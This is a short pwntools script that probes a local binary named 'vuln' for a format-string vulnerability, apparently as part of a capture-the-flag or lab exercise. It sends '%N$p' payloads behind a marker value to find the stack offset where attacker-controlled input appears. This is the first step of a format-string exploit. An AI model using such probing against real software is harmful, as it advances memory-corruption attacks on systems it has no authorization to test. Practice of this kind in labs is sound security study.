#!/home/kali/.venv/bin/python

from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "error"

for i in range(1, 21):
	name = b"hacker"
	username = b"admin\x00"
	password = b"password123\x00"

	marker = p32(0xdeadc0de)
	pointer = f"%{i}$p".encode()
	payload = marker + pointer

	p = process()

	p.sendafter(b"name: ", name)
	p.sendafter(b"username: ", username)
	p.sendafter(b"password: ", password)
	p.sendlineafter(b"category: ", payload)

	if b"deadc0de" in p.recvline():
		print(f"offset : {i}") # 8
		p.close()
		break

	p.close()
